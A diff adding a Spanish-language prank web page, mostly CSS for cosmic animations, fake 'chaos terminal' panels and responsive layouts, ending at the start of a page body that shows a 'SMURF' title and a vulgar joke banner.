+            top: 30%;
+            left: 30%;
+            border-color: #ffff00;
+            animation-duration: 1s;
+        }
+
+        .portal-core {
+            position: absolute;
+            width: 20%;
+            height: 20%;
+            top: 40%;
+            left: 40%;
+            background: radial-gradient(circle, #ffffff, #ff00ff, #00ffff);
+            border-radius: 50%;
+            animation: portal-pulse 1s ease-in-out infinite alternate;
+        }
+
+        @keyframes portal-spin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        @keyframes portal-pulse {
+            0% { 
+                transform: scale(1);
+                box-shadow: 0 0 20px #ffffff;
+            }
+            100% { 
+                transform: scale(1.5);
+                box-shadow: 0 0 50px #ff00ff, 0 0 100px #00ffff;
+            }
+        }
+
+        /* PARTÍCULAS EXPLOSIVAS */
+        .particle-explosion {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            animation: particle-explode 4s ease-out infinite;
+        }
+
+        .particle-1 { background: #ff0000; animation-delay: 0s; }
+        .particle-2 { background: #00ff00; animation-delay: 0.2s; }
+        .particle-3 { background: #0000ff; animation-delay: 0.4s; }
+        .particle-4 { background: #ffff00; animation-delay: 0.6s; }
+        .particle-5 { background: #ff00ff; animation-delay: 0.8s; }
+        .particle-6 { background: #00ffff; animation-delay: 1s; }
+        .particle-7 { background: #ffffff; animation-delay: 1.2s; }
+        .particle-8 { background: #ffa500; animation-delay: 1.4s; }
+
+        @keyframes particle-explode {
+            0% {
+                transform: translate(0, 0) scale(0);
+                opacity: 1;
+            }
+            50% {
+                transform: translate(var(--random-x, 200px), var(--random-y, -200px)) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(var(--random-x, 400px), var(--random-y, -400px)) scale(0);
+                opacity: 0;
+            }
+        }
+
+        .particle-1 { --random-x: 300px; --random-y: -100px; }
+        .particle-2 { --random-x: -250px; --random-y: -150px; }
+        .particle-3 { --random-x: 200px; --random-y: 200px; }
+        .particle-4 { --random-x: -300px; --random-y: 100px; }
+        .particle-5 { --random-x: 150px; --random-y: -300px; }
+        .particle-6 { --random-x: -200px; --random-y: -250px; }
+        .particle-7 { --random-x: 350px; --random-y: 150px; }
+        .particle-8 { --random-x: -150px; --random-y: 300px; }
+
+        /* CASCADA DE CÓDIGO DORADO */
+        .golden-code-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .code-column {
+            position: absolute;
+            top: -100px;
+            color: #ffd700;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            text-shadow: 0 0 10px #ffd700;
+            animation: code-fall 6s linear infinite;
+            opacity: 0.8;
+        }
+
+        .code-col-1 { left: 10%; animation-delay: 0s; }
+        .code-col-2 { left: 30%; animation-delay: 1s; }
+        .code-col-3 { left: 50%; animation-delay: 2s; }
+        .code-col-4 { left: 70%; animation-delay: 3s; }
+        .code-col-5 { left: 90%; animation-delay: 4s; }
+
+        @keyframes code-fall {
+            0% {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+            20% {
+                opacity: 1;
+            }
+            80% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(calc(100vh + 100px));
+                opacity: 0;
+            }
+        }
+
+        /* MENSAJE REVOLUCIONARIO CÓSMICO */
+        .revolutionary-message {
+            position: absolute;
+            top: 15%;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            z-index: 10001;
+        }
+
+        .message-line-1, .message-line-2, .message-line-3 {
+            font-family: 'Share Tech Mono', monospace;
+            font-weight: bold;
+            margin: 20px 0;
+            opacity: 0;
+            transform: translateY(50px);
+        }
+
+        .message-line-1 {
+            font-size: 3em;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ffff00, #00ff00, #0000ff, #8000ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: message-appear 2s ease-out 2s forwards, rainbow-text 3s linear infinite;
+        }
+
+        .message-line-2 {
+            font-size: 2em;
+            color: #00ffff;
+            text-shadow: 0 0 20px #00ffff;
+            animation: message-appear 2s ease-out 3s forwards;
+        }
+
+        .message-line-3 {
+            font-size: 2.5em;
+            color: #ffd700;
+            text-shadow: 0 0 30px #ffd700;
+            animation: message-appear 2s ease-out 4s forwards, glow-pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes message-appear {
+            0% {
+                opacity: 0;
+                transform: translateY(50px) scale(0.5);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes rainbow-text {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% {
+                text-shadow: 0 0 30px #ffd700;
+            }
+            50% {
+                text-shadow: 0 0 50px #ffd700, 0 0 80px #ffd700;
+            }
+        }
+
+        /* ONDAS DE ENERGÍA CÓSMICA */
+        .cosmic-waves {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .cosmic-wave {
+            position: absolute;
+            border: 3px solid;
+            border-radius: 50%;
+            animation: cosmic-wave-expand 6s ease-out infinite;
+        }
+
+        .cosmic-wave.wave-1 {
+            border-color: rgba(255, 100, 255, 0.8);
+            animation-delay: 0s;
+        }
+
+        .cosmic-wave.wave-2 {
+            border-color: rgba(100, 255, 255, 0.8);
+            animation-delay: 2s;
+        }
+
+        .cosmic-wave.wave-3 {
+            border-color: rgba(255, 255, 100, 0.8);
+            animation-delay: 4s;
+        }
+
+        @keyframes cosmic-wave-expand {
+            0% {
+                width: 0;
+                height: 0;
+                opacity: 1;
+                box-shadow: 0 0 20px currentColor;
+            }
+            50% {
+                opacity: 0.8;
+                box-shadow: 0 0 40px currentColor;
+            }
+            100% {
+                width: 1000px;
+                height: 1000px;
+                margin: -500px 0 0 -500px;
+                opacity: 0;
+                box-shadow: 0 0 60px currentColor;
+            }
+        }
+
+        /* ANIMACIÓN PARA PARTÍCULAS DINÁMICAS CÓSMICAS */
+        @keyframes dynamic-particle-float {
+            0% {
+                transform: translate(0, 0) scale(0) rotate(0deg);
+                opacity: 1;
+                box-shadow: 0 0 10px currentColor;
+            }
+            50% {
+                transform: translate(var(--random-x, 100px), var(--random-y, -100px)) scale(2) rotate(180deg);
+                opacity: 1;
+                box-shadow: 0 0 20px currentColor;
+            }
+            100% {
+                transform: translate(var(--random-x, 200px), var(--random-y, -200px)) scale(0) rotate(360deg);
+                opacity: 0;
+                box-shadow: 0 0 30px currentColor;
+            }
+        }
+
+        /* OPTIMIZACIONES PARA TOUCH Y MÓVIL */
+        .paradise-button {
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        .music-button {
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        /* PREVENIR ZOOM EN INPUTS Y BOTONES */
+        button, input, select, textarea {
+            font-size: 16px !important;
+        }
+
+        /* OPTIMIZACIÓN DE RENDIMIENTO PARA MÓVIL */
+        .revolutionary-finale * {
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+            -webkit-backface-visibility: hidden;
+        }
+
+        .chaos-terminal {
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+            -webkit-backface-visibility: hidden;
+        }
+
+        /* SCROLL SUAVE EN MÓVIL */
+        html {
+            -webkit-overflow-scrolling: touch;
+            scroll-behavior: smooth;
+        }
+
+        /* PREVENIR SELECCIÓN DE TEXTO EN MÓVIL */
+        .title, .subtitle, .big-text, .revolutionary-message {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* ========================================
+           RESPONSIVE DESIGN - MÓVIL Y TABLET
+           ======================================== */
+
+        /* MÓVIL - Pantallas pequeñas (hasta 768px) */
+        @media screen and (max-width: 768px) {
+            /* TÍTULO PRINCIPAL */
+            .title {
+                font-size: 2.5rem !important;
+                margin-bottom: 10px;
+            }
+
+            .subtitle {
+                font-size: 0.7rem !important;
+                margin-bottom: 15px;
+            }
+
+            /* MENSAJE PRINCIPAL */
+            .big-text {
+                font-size: 1.8rem !important;
+                line-height: 1.3;
+                padding: 15px;
+                margin: 10px 0;
+            }
+
+            /* BOTÓN PRINCIPAL */
+            .paradise-button {
+                font-size: 1.2rem !important;
+                padding: 15px 25px !important;
+                margin: 20px auto !important;
+                width: 90% !important;
+                max-width: 300px !important;
+            }
+
+            /* TERMINALES DE CAOS */
+            .chaos-terminal {
+                width: 85vw !important;
+                height: 40vh !important;
+                font-size: 0.7rem !important;
+                max-width: none !important;
+            }
+
+            .chaos-terminal-header {
+                font-size: 0.8rem !important;
+                padding: 5px 10px !important;
+            }
+
+            .chaos-terminal-content {
+                font-size: 0.6rem !important;
+                line-height: 1.2 !important;
+            }
+
+            /* SISTEMA SOLAR MÓVIL */
+            .solar-system {
+                width: 300px !important;
+                height: 300px !important;
+            }
+
+            .sun {
+                width: 20px !important;
+                height: 20px !important;
+            }
+
+            /* ÓRBITAS MÁS PEQUEÑAS */
+            .mercury-orbit { width: 40px !important; height: 40px !important; }
+            .venus-orbit { width: 50px !important; height: 50px !important; }
+            .earth-orbit { width: 65px !important; height: 65px !important; }
+            .mars-orbit { width: 80px !important; height: 80px !important; }
+            .jupiter-orbit { width: 110px !important; height: 110px !important; }
+            .saturn-orbit { width: 140px !important; height: 140px !important; }
+            .uranus-orbit { width: 170px !important; height: 170px !important; }
+            .neptune-orbit { width: 200px !important; height: 200px !important; }
+
+            /* PLANETAS MÁS PEQUEÑOS */
+            .mercury { width: 3px !important; height: 3px !important; }
+            .venus { width: 4px !important; height: 4px !important; }
+            .earth { width: 5px !important; height: 5px !important; }
+            .mars { width: 4px !important; height: 4px !important; }
+            .jupiter { width: 10px !important; height: 10px !important; }
+            .saturn { width: 8px !important; height: 8px !important; }
+            .uranus { width: 6px !important; height: 6px !important; }
+            .neptune { width: 6px !important; height: 6px !important; }
+
+            .moon { width: 2px !important; height: 2px !important; top: -8px !important; }
+            .saturn-rings { width: 12px !important; height: 12px !important; }
+
+            /* NEBULOSAS MÁS PEQUEÑAS */
+            .nebula-1 { width: 150px !important; height: 100px !important; }
+            .nebula-2 { width: 125px !important; height: 90px !important; }
+            .nebula-3 { width: 100px !important; height: 75px !important; }
+
+            /* GALAXIAS MÁS PEQUEÑAS */
+            .galaxy { width: 75px !important; height: 75px !important; }
+
+            /* PORTAL MÁS PEQUEÑO */
+            .dimensional-portal {
+                width: 100px !important;
+                height: 100px !important;
+            }
+
+            .portal-ring {
+                border-width: 1px !important;
+            }
+
+            .portal-core {
+                width: 15px !important;
+                height: 15px !important;
+            }
+
+            /* MENSAJES REVOLUCIONARIOS */
+            .revolutionary-message {
+                top: 10% !important;
+                width: 90% !important;
+                left: 5% !important;
+                transform: none !important;
+            }
+
+            .message-line-1 {
+                font-size: 1.2rem !important;
+            }
+
+            .message-line-2 {
+                font-size: 1rem !important;
+            }
+
+            .message-line-3 {
+                font-size: 1.1rem !important;
+            }
+
+            /* ESTRELLAS MÁS PEQUEÑAS */
+            .star-big { width: 2px !important; height: 2px !important; }
+            .star-medium { width: 1px !important; height: 1px !important; }
+            .star-small { width: 0.5px !important; height: 0.5px !important; }
+
+            /* COMETAS Y ASTEROIDES */
+            .comet { width: 3px !important; height: 3px !important; }
+            .comet::after { width: 20px !important; }
+            .asteroid { transform: scale(0.5) !important; }
+
+            /* BOTÓN DE MÚSICA */
+            .music-button {
+                font-size: 1rem !important;
+                padding: 10px 15px !important;
+                bottom: 20px !important;
+                right: 20px !important;
+            }
+        }
+
+        /* TABLET - Pantallas medianas (769px - 1024px) */
+        @media screen and (min-width: 769px) and (max-width: 1024px) {
+            .title {
+                font-size: 3.5rem !important;
+            }
+
+            .big-text {
+                font-size: 2.2rem !important;
+            }
+
+            .paradise-button {
+                font-size: 1.4rem !important;
+                padding: 18px 30px !important;
+            }
+
+            .chaos-terminal {
+                width: 70vw !important;
+                height: 45vh !important;
+                font-size: 0.8rem !important;
+            }
+
+            .solar-system {
+                width: 450px !important;
+                height: 450px !important;
+            }
+
+            .sun {
+                width: 30px !important;
+                height: 30px !important;
+            }
+
+            /* ÓRBITAS MEDIANAS */
+            .mercury-orbit { width: 60px !important; height: 60px !important; }
+            .venus-orbit { width: 75px !important; height: 75px !important; }
+            .earth-orbit { width: 100px !important; height: 100px !important; }
+            .mars-orbit { width: 120px !important; height: 120px !important; }
+            .jupiter-orbit { width: 165px !important; height: 165px !important; }
+            .saturn-orbit { width: 210px !important; height: 210px !important; }
+            .uranus-orbit { width: 255px !important; height: 255px !important; }
+            .neptune-orbit { width: 300px !important; height: 300px !important; }
+
+            .dimensional-portal {
+                width: 150px !important;
+                height: 150px !important;
+            }
+        }
+
+        /* PANTALLAS MUY PEQUEÑAS - Móviles en vertical (hasta 480px) */
+        @media screen and (max-width: 480px) {
+            .title {
+                font-size: 2rem !important;
+            }
+
+            .big-text {
+                font-size: 1.4rem !important;
+                padding: 10px;
+            }
+
+            .paradise-button {
+                font-size: 1rem !important;
+                padding: 12px 20px !important;
+                width: 95% !important;
+            }
+
+            .chaos-terminal {
+                width: 95vw !important;
+                height: 35vh !important;
+                font-size: 0.6rem !important;
+            }
+
+            .solar-system {
+                width: 250px !important;
+                height: 250px !important;
+            }
+
+            .sun {
+                width: 15px !important;
+                height: 15px !important;
+            }
+
+            /* ÓRBITAS EXTRA PEQUEÑAS */
+            .mercury-orbit { width: 30px !important; height: 30px !important; }
+            .venus-orbit { width: 40px !important; height: 40px !important; }
+            .earth-orbit { width: 50px !important; height: 50px !important; }
+            .mars-orbit { width: 60px !important; height: 60px !important; }
+            .jupiter-orbit { width: 80px !important; height: 80px !important; }
+            .saturn-orbit { width: 100px !important; height: 100px !important; }
+            .uranus-orbit { width: 120px !important; height: 120px !important; }
+            .neptune-orbit { width: 140px !important; height: 140px !important; }
+
+            .message-line-1 { font-size: 1rem !important; }
+            .message-line-2 { font-size: 0.8rem !important; }
+            .message-line-3 { font-size: 0.9rem !important; }
+        }
+
+        /* ORIENTACIÓN HORIZONTAL EN MÓVIL */
+        @media screen and (max-height: 500px) and (orientation: landscape) {
+            .title {
+                font-size: 2rem !important;
+                margin-bottom: 5px !important;
+            }
+
+            .big-text {
+                font-size: 1.2rem !important;
+                margin: 5px 0 !important;
+            }
+
+            .paradise-button {
+                font-size: 1rem !important;
+                padding: 8px 15px !important;
+                margin: 10px auto !important;
+            }
+
+            .revolutionary-message {
+                top: 5% !important;
+            }
+
+            .message-line-1 { font-size: 0.9rem !important; }
+            .message-line-2 { font-size: 0.7rem !important; }
+            .message-line-3 { font-size: 0.8rem !important; }
+
+            .solar-system {
+                width: 200px !important;
+                height: 200px !important;
+            }
+        }
+
+        /* TERMINAL PRINCIPAL RESPONSIVE */
+        @media screen and (max-width: 768px) {
+            .terminal {
+                width: 95vw !important;
+                height: auto !important;
+                min-height: 80vh;
+                padding: 15px !important;
+                margin: 10px auto !important;
+                font-size: 14px !important;
+            }
+
+            .title {
+                font-size: 3rem !important;
+                margin-bottom: 15px !important;
+            }
+
+            .big-text {
+                font-size: 1.8rem !important;
+                line-height: 1.3 !important;
+                padding: 15px !important;
+                margin: 15px 0 !important;
+            }
+
+            .paradise-button {
+                font-size: 1.2rem !important;
+                padding: 15px 30px !important;
+                margin: 20px auto !important;
+                width: 80% !important;
+                max-width: 300px !important;
+            }
+
+            /* TERMINALES DE CAOS */
+            .chaos-terminal {
+                width: 90vw !important;
+                height: 60vh !important;
+                font-size: 12px !important;
+                padding: 10px !important;
+            }
+
+            .chaos-terminal-header {
+                font-size: 12px !important;
+                padding: 5px 10px !important;
+            }
+
+            /* SISTEMA SOLAR MÓVIL */
+            .solar-system {
+                width: 300px !important;
+                height: 300px !important;
+            }
+
+            .sun {
+                width: 20px !important;
+                height: 20px !important;
+            }
+
+            .mercury-orbit { width: 40px !important; height: 40px !important; }
+            .venus-orbit { width: 50px !important; height: 50px !important; }
+            .earth-orbit { width: 65px !important; height: 65px !important; }
+            .mars-orbit { width: 80px !important; height: 80px !important; }
+            .jupiter-orbit { width: 110px !important; height: 110px !important; }
+            .saturn-orbit { width: 140px !important; height: 140px !important; }
+            .uranus-orbit { width: 170px !important; height: 170px !important; }
+            .neptune-orbit { width: 200px !important; height: 200px !important; }
+
+            .jupiter { width: 12px !important; height: 12px !important; }
+            .saturn { width: 10px !important; height: 10px !important; }
+            .saturn-rings { width: 16px !important; height: 16px !important; }
+
+            /* NEBULOSAS MÓVIL */
+            .nebula-1 { width: 150px !important; height: 100px !important; }
+            .nebula-2 { width: 120px !important; height: 90px !important; }
+            .nebula-3 { width: 100px !important; height: 75px !important; }
+
+            /* GALAXIAS MÓVIL */
+            .galaxy { width: 80px !important; height: 80px !important; }
+
+            /* PORTAL DIMENSIONAL MÓVIL */
+            .dimensional-portal {
+                width: 120px !important;
+                height: 120px !important;
+            }
+
+            .portal-ring {
+                border-width: 2px !important;
+            }
+
+            /* MENSAJES REVOLUCIONARIOS MÓVIL */
+            .revolutionary-message {
+                top: 10% !important;
+                width: 90% !important;
+            }
+
+            .message-line-1 {
+                font-size: 1.2rem !important;
+            }
+
+            .message-line-2 {
+                font-size: 1rem !important;
+            }
+
+            .message-line-3 {
+                font-size: 0.9rem !important;
+            }
+
+            /* BOTÓN DE MÚSICA MÓVIL */
+            .music-button {
+                font-size: 1rem !important;
+                padding: 12px 25px !important;
+                width: 80% !important;
+                max-width: 250px !important;
+            }
+        }
+
+        /* TABLET - Pantallas medianas (769px - 1024px) */
+        @media screen and (min-width: 769px) and (max-width: 1024px) {
+            
+            .terminal {
+                width: 85vw !important;
+                padding: 20px !important;
+            }
+
+            .title {
+                font-size: 4rem !important;
+            }
+
+            .big-text {
+                font-size: 2.2rem !important;
+            }
+
+            .chaos-terminal {
+                width: 80vw !important;
+                height: 65vh !important;
+            }
+
+            .solar-system {
+                width: 450px !important;
+                height: 450px !important;
+            }
+
+            .sun {
+                width: 30px !important;
+                height: 30px !important;
+            }
+
+            .mercury-orbit { width: 60px !important; height: 60px !important; }
+            .venus-orbit { width: 75px !important; height: 75px !important; }
+            .earth-orbit { width: 100px !important; height: 100px !important; }
+            .mars-orbit { width: 120px !important; height: 120px !important; }
+            .jupiter-orbit { width: 165px !important; height: 165px !important; }
+            .saturn-orbit { width: 210px !important; height: 210px !important; }
+            .uranus-orbit { width: 255px !important; height: 255px !important; }
+            .neptune-orbit { width: 300px !important; height: 300px !important; }
+        }
+
+        /* MÓVIL HORIZONTAL */
+        @media screen and (max-width: 768px) and (orientation: landscape) {
+            
+            .terminal {
+                height: 90vh !important;
+                width: 95vw !important;
+            }
+
+            .big-text {
+                font-size: 1.5rem !important;
+            }
+
+            .chaos-terminal {
+                height: 70vh !important;
+            }
+
+            .revolutionary-message {
+                top: 5% !important;
+            }
+
+            .message-line-1 {
+                font-size: 1rem !important;
+            }
+
+            .message-line-2 {
+                font-size: 0.9rem !important;
+            }
+
+            .message-line-3 {
+                font-size: 0.8rem !important;
+            }
+        }
+
+        /* PANTALLAS MUY PEQUEÑAS (menos de 480px) */
+        @media screen and (max-width: 480px) {
+            
+            .title {
+                font-size: 2.5rem !important;
+            }
+
+            .big-text {
+                font-size: 1.4rem !important;
+                padding: 10px !important;
+            }
+
+            .paradise-button {
+                font-size: 1rem !important;
+                padding: 12px 20px !important;
+            }
+
+            .chaos-terminal {
+                font-size: 10px !important;
+                height: 50vh !important;
+            }
+
+            .solar-system {
+                width: 250px !important;
+                height: 250px !important;
+            }
+
+            .sun {
+                width: 15px !important;
+                height: 15px !important;
+            }
+
+            .mercury-orbit { width: 30px !important; height: 30px !important; }
+            .venus-orbit { width: 40px !important; height: 40px !important; }
+            .earth-orbit { width: 50px !important; height: 50px !important; }
+            .mars-orbit { width: 60px !important; height: 60px !important; }
+            .jupiter-orbit { width: 80px !important; height: 80px !important; }
+            .saturn-orbit { width: 100px !important; height: 100px !important; }
+            .uranus-orbit { width: 120px !important; height: 120px !important; }
+            .neptune-orbit { width: 140px !important; height: 140px !important; }
+
+            .jupiter { width: 8px !important; height: 8px !important; }
+            .saturn { width: 7px !important; height: 7px !important; }
+            .saturn-rings { width: 12px !important; height: 12px !important; }
+
+            .message-line-1 {
+                font-size: 1rem !important;
+            }
+
+            .message-line-2 {
+                font-size: 0.8rem !important;
+            }
+
+            .message-line-3 {
+                font-size: 0.7rem !important;
+            }
+        }
+
+        /* TOUCH IMPROVEMENTS */
+        @media (hover: none) and (pointer: coarse) {
+            
+            .paradise-button {
+                min-height: 50px !important;
+                touch-action: manipulation;
+            }
+
+            .music-button {
+                min-height: 50px !important;
+                touch-action: manipulation;
+            }
+
+            /* Mejorar área de toque */
+            .paradise-button:active {
+                transform: scale(0.95) !important;
+            }
+
+            .music-button:active {
+                transform: scale(0.95) !important;
+            }
+        }
+
+        .chaos-terminal-header {
+            padding: 8px 15px;
+            margin: 0 0 15px 0;
+            font-weight: bold;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 8px 8px 0 0;
+        }
+
+        /* Headers diferentes para cada tema */
+        .theme-1 .chaos-terminal-header {
+            background: linear-gradient(45deg, #ff0000, #cc0000);
+            color: #ffffff;
+            border-bottom: 2px solid #ff0000;
+        }
+
+        .theme-2 .chaos-terminal-header {
+            background: linear-gradient(45deg, #00ff00, #00cc00);
+            color: #000000;
+            border-bottom: 2px solid #00ff00;
+        }
+
+        .theme-3 .chaos-terminal-header {
+            background: linear-gradient(45deg, #0099ff, #0077cc);
+            color: #ffffff;
+            border-bottom: 2px solid #0099ff;
+        }
+
+        .theme-4 .chaos-terminal-header {
+            background: linear-gradient(45deg, #ff6600, #cc5500);
+            color: #ffffff;
+            border-bottom: 2px solid #ff6600;
+        }
+
+        .theme-5 .chaos-terminal-header {
+            background: linear-gradient(45deg, #ff00ff, #cc00cc);
+            color: #ffffff;
+            border-bottom: 2px solid #ff00ff;
+        }
+
+        .theme-6 .chaos-terminal-header {
+            background: linear-gradient(45deg, #ffff00, #cccc00);
+            color: #000000;
+            border-bottom: 2px solid #ffff00;
+        }
+
+        .theme-7 .chaos-terminal-header {
+            background: linear-gradient(45deg, #00ffff, #00cccc);
+            color: #000000;
+            border-bottom: 2px solid #00ffff;
+        }
+
+        .theme-8 .chaos-terminal-header {
+            background: linear-gradient(45deg, #9900ff, #7700cc);
+            color: #ffffff;
+            border-bottom: 2px solid #9900ff;
+        }
+
+        .theme-9 .chaos-terminal-header {
+            background: linear-gradient(45deg, #ff9900, #cc7700);
+            color: #ffffff;
+            border-bottom: 2px solid #ff9900;
+        }
+
+        .chaos-terminal-content {
+            height: calc(100% - 60px);
+            overflow-y: auto;
+            line-height: 1.4;
+            padding: 15px 20px;
+            font-size: 13px;
+        }
+
+        .chaos-cmd {
+            margin: 2px 0;
+            display: flex;
+        }
+
+        .chaos-prompt {
+            color: #ff0000;
+            margin-right: 5px;
+            font-weight: bold;
+        }
+
+        .chaos-command {
+            color: #ffffff;
+        }
+
+        .chaos-output {
+            color: #00ff00;
+            margin: 1px 0 5px 20px;
+            font-size: 9px;
+        }
+
+        .chaos-output.error {
+            color: #ff0000;
+        }
+
+        .chaos-output.warning {
+            color: #ffff00;
+        }
+
+        /* TEXTO PRINCIPAL ENORME */
+        .main-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            background: linear-gradient(45deg, #000000, #1a1a1a, #000000);
+            animation: background-pulse 3s ease-in-out infinite;
+        }
+
+        .smurf-title {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: clamp(4rem, 15vw, 10rem);
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 30px;
+            background: linear-gradient(
+                45deg,
+                #ff0000, #ff6600, #ffff00, #ff0000
+            );
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: smurf-glow 2s linear infinite;
+            text-shadow: 0 0 40px rgba(255, 0, 0, 0.8);
+        }
+
+        @keyframes smurf-glow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .main-message-text {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: clamp(2.5rem, 10vw, 6rem);
+            font-weight: bold;
+            text-align: center;
+            padding: 20px;
+            margin: 20px 0;
+            background: linear-gradient(
+                45deg,
+                #ff0000, #ff6600, #ffff00, #00ff00, 
+                #0099ff, #6600ff, #ff00ff, #ff0000
+            );
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: rainbow-text 2s linear infinite, text-glow 1.5s ease-in-out infinite alternate;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+            line-height: 1.1;
+            max-width: 95%;
+        }
+
+        .paradise-text {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: clamp(2rem, 6vw, 4rem);
+            font-weight: bold;
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px 40px;
+            background: linear-gradient(
+                45deg,
+                #00ff00, #00ffff, #ffffff, #ffff00, #00ff00
+            );
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: paradise-glow 3s linear infinite, paradise-pulse 2s ease-in-out infinite alternate;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
+            cursor: pointer;
+            border: 3px solid transparent;
+            border-radius: 15px;
+            background-clip: text, border-box;
+            background-origin: border-box;
+            transition: all 0.3s ease;
+        }
+
+        .paradise-text:hover {
+            transform: scale(1.1);
+            filter: brightness(1.3);
+        }
+
+        @keyframes paradise-glow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes paradise-pulse {
+            0% { 
+                filter: drop-shadow(0 0 10px #00ff00) drop-shadow(0 0 20px #00ffff);
+            }
+            100% { 
+                filter: drop-shadow(0 0 20px #ffffff) drop-shadow(0 0 40px #ffff00);
+            }
+        }
+
+
+
+        @keyframes rainbow-text {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes text-glow {
+            0% { 
+                filter: drop-shadow(0 0 10px #ff0000) drop-shadow(0 0 20px #ff0000);
+                transform: scale(1);
+            }
+            100% { 
+                filter: drop-shadow(0 0 20px #00ff00) drop-shadow(0 0 40px #00ff00);
+                transform: scale(1.02);
+            }
+        }
+
+        @keyframes background-pulse {
+            0%, 100% { background: linear-gradient(45deg, #000000, #1a1a1a, #000000); }
+            50% { background: linear-gradient(45deg, #1a0000, #2a1a1a, #1a0000); }
+        }
+
+        /* IMAGEN FINAL */
+        .final-image-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                #87CEEB 0%,
+                #98D8E8 20%,
+                #B0E0E6 40%,
+                #E0F6FF 60%,
+                #F0F8FF 80%,
+                #FFFFFF 100%
+            );
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            animation: fade-in 3s ease-in;
+        }
+
+        .final-image-container.active {
+            display: flex;
+        }
+
+        .final-image {
+            max-width: 80%;
+            max-height: 80%;
+            border: 5px solid #ff0000;
+            border-radius: 15px;
+            box-shadow: 
+                0 0 50px #ff0000,
+                0 0 100px #ff0000;
+            animation: image-glow 3s infinite;
+        }
+
+        @keyframes fade-in {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes image-glow {
+            0%, 100% { 
+                box-shadow: 
+                    0 0 50px #ff0000,
+                    0 0 100px #ff0000;
+            }
+            50% { 
+                box-shadow: 
+                    0 0 80px #ff0000,
+                    0 0 150px #ff0000,
+                    0 0 200px #ff6600;
+            }
+        }
+
+        /* Responsive para pantalla de entrada */
+        @media (max-width: 768px) {
+            .entry-title {
+                font-size: 3.5rem;
+            }
+            
+            .entry-subtitle {
+                font-size: 1.2rem;
+            }
+            
+            .entry-button {
+                padding: 15px 30px;
+                font-size: 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .entry-title {
+                font-size: 2.5rem;
+                letter-spacing: 5px;
+            }
+            
+            .entry-subtitle {
+                font-size: 1rem;
+            }
+            
+            .entry-button {
+                padding: 12px 25px;
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- MENSAJE PRINCIPAL ENORME -->
+    <div class="main-message" id="mainMessage">
+        <div class="smurf-title">SMURF</div>
+        <div class="main-message-text">
+            ME GASTO EL DINERO DE TUS PADRES EN PUTAS Y COCAÍNA
+        </div>
+        <div class="paradise-text" onclick="startParadise()">
+            ✨ ACCEDER AL PARAÍSO ✨
+        </div>
+    </div>
+
+
+
+    <!-- FONDO ESPACIAL -->
+    <div class="heaven-background" id="heavenBackground"></div>
+
+    <!-- EFECTO FINAL REVOLUCIONARIO - UNIVERSO REALISTA -->
+    <div class="revolutionary-finale" id="revolutionaryFinale">
+        <!-- Fondo del universo profundo -->
+        <div class="deep-universe-bg"></div>
+        
